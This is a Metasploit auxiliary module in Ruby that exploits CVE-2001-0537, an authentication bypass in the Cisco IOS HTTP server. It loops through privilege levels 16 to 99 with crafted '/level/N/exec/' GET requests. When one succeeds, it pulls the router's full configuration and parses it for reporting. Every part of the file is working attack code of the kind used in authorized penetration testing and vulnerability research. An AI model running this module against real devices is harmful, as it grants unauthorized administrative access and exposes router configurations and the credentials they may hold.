##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'



class Metasploit3 < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient

  # Include Cisco utility methods
  include Msf::Auxiliary::Cisco

  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Cisco IOS HTTP Unauthorized Administrative Access',
      'Description'    => %q{
        This module exploits a vulnerability in the Cisco IOS HTTP Server.
        By sending a GET request for "/level/num/exec/..", where num is between
        16 and 99, it is possible to bypass authentication and obtain full system
        control. IOS 11.3 -> 12.2 are reportedly vulnerable. This module
        tested successfully against a Cisco 1600 Router IOS v11.3(11d).
      },
      'Author'		=> [ 'Patrick Webster <patrick[at]aushack.com>', 'hdm' ],
      'License'		=> MSF_LICENSE,
      'References'	=>
        [
          [ 'BID', '2936'],
          [ 'CVE', '2001-0537'],
          [ 'URL', 'http://www.cisco.com/warp/public/707/cisco-sa-20010627-ios-http-level.shtml'],
          [ 'OSVDB', '578' ],
        ],
      'DisclosureDate' => 'Jun 27 2001'))
  end

  def run_host(ip)

    16.upto(99) do |level|
      res = send_request_cgi({
        'uri'  		=>  "/level/#{level}/exec/show/version/CR",
        'method'   	=> 'GET'
      }, 20)

      if res and res.body and res.body =~ /Cisco Internetwork Operating System Software/
        print_good("#{rhost}:#{rport} Found vulnerable privilege level: #{level}")

        report_vuln(
          {
            :host	=> rhost,
            :port	=> rport,
            :proto  => 'tcp',
            :name	=> self.name,
            :sname  => ssl ? "https" : "http",
            :info	=> "Module #{self.fullname} successfully accessed http://#{rhost}:#{rport}/level/#{level}/exec/show/version/CR",
            :refs   => self.references,
            :exploited_at => Time.now.utc
          }
        )

        res = send_request_cgi({
          'uri'  		=>  "/level/#{level}/exec/show/config/CR",
          'method'   	=> 'GET'
        }, 20)

        if res and res.body and res.body =~ /<FORM METHOD([^\>]+)\>(.*)<\/FORM>/mi
          config = $2.strip
          print_good("#{rhost}:#{rport} Processing the configuration file...")
          cisco_ios_config_eater(rhost, rport, config)
          report_exploit(
            {
              :host		=> rhost,
              :port		=> rport,
              :name		=> self.name,
              :sname      => ssl ? "https" : "http",
              :info       => "Module #{self.fullname} successfully captured the configuration file:\n#{config}"
            }
          )
        else
          print_error("#{rhost}:#{rport} Error: could not retrieve the IOS configuration")
        end

        break
      end
    end
  end

end
